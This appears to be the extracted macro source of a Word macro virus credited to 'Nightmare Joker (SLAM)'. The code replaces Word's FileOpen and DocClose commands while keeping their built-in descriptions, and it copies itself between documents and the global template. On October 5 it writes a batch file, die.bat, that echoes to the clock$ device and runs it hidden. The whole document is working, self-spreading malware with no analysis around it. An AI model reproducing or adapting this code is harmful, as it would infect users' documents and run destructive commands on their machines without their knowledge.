   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Öffnet ein bereits vorhandenes Dokument oder eine Dokumentvorlage."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
   Dim i
   Dim Installed
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   WordBasic.CurValues.FileOpen dlg
   WordBasic.Dialog.FileOpen dlg
   WordBasic.FileOpen dlg
   On Error GoTo -1: On Error GoTo Finish
   If WordBasic.CountMacros(1) > 0 Then
       For i = 1 To WordBasic.CountMacros(1)
       If WordBasic.[MacroName$](i, 1) = "SUNBEAM" Then
           Installed = 1
       End If
       Next i
   End If
   If Installed = 0 Then
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:SUNBEAM", WordBasic.[WindowName$]() + ":SUNBEAM"
   WordBasic.MacroCopy "Global:FileOpen", WordBasic.[WindowName$]() + ":FileOpen"
   WordBasic.MacroCopy "Global:DocClose", WordBasic.[WindowName$]() + ":DocClose"
   WordBasic.FileSaveAll 1, 1
   End If
   Finish:
   WordBasic.Call "SUNBEAM"
   End Sub

   Attribute VB_Name = "DocClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Schließt alle Fenster des aktiven Dokuments."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DocClose.MAIN"
   Dim i
   Dim Installed
   If WordBasic.CountMacros(0) > 0 Then
       For i = 1 To WordBasic.CountMacros(0)
       If WordBasic.[MacroName$](i, 0) = "SUNBEAM" Then
           Installed = 1
       End If
       Next i
   End If
   If Installed = 0 Then
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":SUNBEAM", "Global:SUNBEAM"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileOpen", "Global:FileOpen"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":DocClose", "Global:DocClose"
   WordBasic.FileSaveAll 1, 0
   End If
   Finish:
   WordBasic.Call "SUNBEAM"
   WordBasic.DocClose
   End Sub

   Attribute VB_Name = "SUNBEAM"

   Public Sub MAIN()
   Dim a$
   Dim b$
   If WordBasic.Day(WordBasic.Now()) = 5 And WordBasic.Month(WordBasic.Now()) = 10 Then
       a$ = WordBasic.[MacroFileName$]("SUNBEAM")
       b$ = WordBasic.[Left$](a$, 3)
       Open b$ + "die.bat" For Output As 1
       Print #1, "echo 123>clock$"
       Close 1
       WordBasic.Shell b$ + "die.bat", 0
   End If
   Rem Thanks McNasty.
   Rem SUNBEAM by Nightmare Joker (SLAM)
   End Sub
